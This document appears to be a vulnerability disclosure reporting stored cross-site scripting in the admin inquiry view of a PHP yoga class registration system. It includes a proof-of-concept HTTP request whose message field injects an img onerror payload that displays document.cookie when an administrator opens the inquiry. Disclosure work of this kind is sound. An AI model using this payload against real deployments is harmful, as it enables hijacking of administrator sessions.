## Yoga Class Registration System has xss vulnerability

## submitter
zhangMingMing

## supplier
https://www.sourcecodester.com/php/16097/yoga-class-registration-system-php-and-mysql-free-source-code.html

## Vulnerability file
/php-ycrs/admin/inquiries/view_inquiry.php

## Vulnerability analysis

<img width="1299" alt="image" src="https://github.com/user-attachments/assets/04f7a45b-c9e2-4d3b-8827-b99dbaf8cc3c">

## describe
There is a vulnerability in the yoga registration system that allows unrestricted xss. An attacker can exploit this vulnerability to obtain cookies on the target system without authorization.

POC
```
GET /php-ycrs/?id=&fullname=123&contact=12321&email=213123%40qq.com&subject=3123&message=%3Cimg+src%3D1+onerror%3Dalert%28document.cookie%29%3E HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://localhost/php-ycrs/?p=contact
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
```

The front desk submits, and the backend administrator logs in and triggers xss without any sense.
<img width="1357" alt="image" src="https://github.com/user-attachments/assets/e6e686d9-5793-4ef3-b509-ad7edb0fc677">

<img width="1709" alt="image" src="https://github.com/user-attachments/assets/f7bea2d7-d351-414f-b097-afc65c20b77b">

<img width="1547" alt="image" src="https://github.com/user-attachments/assets/605fc9e7-3575-4d59-b861-a409b378f6a2">












